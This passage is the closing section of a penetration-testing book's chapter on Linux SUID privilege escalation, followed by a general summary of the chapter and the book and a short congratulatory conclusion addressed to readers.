  type: TYPE_NORMAL
- en: With that, we successfully elevated our privileges by exploiting an improperly
    configured SUID binary, which utilized a shared object file that was stored in
    an unprivileged user account's home directory.
  prefs: []
  type: TYPE_NORMAL
- en: Various techniques can be used to exploit SUID binaries. However, the most important
    factor in this process involves thoroughly enumerating and gathering as much information
    as possible from the target SUID, and then analyzing it for potential misconfigurations
    or vulnerabilities. This process will differ from target to target and, as a result,
    requires a keen eye and a methodological approach to help identify misconfigurations
    or vulnerabilities in SUID binaries.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we started by looking at how filesystem permissions work on
    Linux and how SUID permissions are used. We then took an in-depth look at how
    to search for and identify SUID binaries on the target system, both manually and
    automatically. We also briefly explored the process of identifying vulnerable
    SUID binaries, before looking at how to elevate our privileges by exploiting misconfigured
    SUID binaries.
  prefs: []
  type: TYPE_NORMAL
- en: If you have made it this far, congratulations! You should now be well-versed
    in elevating your privileges on both Windows and Linux by leveraging and exploiting
    various vulnerabilities on both operating systems.
  prefs: []
  type: TYPE_NORMAL
- en: If this was your initial foray into the process of privilege escalation, you
    should now have the necessary skills to identify and exploit vulnerabilities on
    target systems to elevate your privileges.
  prefs: []
  type: TYPE_NORMAL
- en: This book was designed to be a practical guide on how to enumerate as much information
    as possible from Windows and Linux targets, as well as how to use this information
    to identify vulnerabilities that can be exploited to elevate your privileges.
    This book sought to accomplish this by providing practical exercises that tested
    and verified what you learned in each chapter.
  prefs: []
  type: TYPE_NORMAL
- en: This book covered all of the most important privilege escalation vectors for
    both Windows and Linux systems, and it also provided you with real-world scenarios
    where these vectors can be exploited.
  prefs: []
  type: TYPE_NORMAL
- en: I hope you enjoyed this book, found value in every chapter, regardless of your
    skill level, and have been able to improve your privilege escalation skills to
    enhance your skillset as a penetration tester.
  prefs: []
  type: TYPE_NORMAL
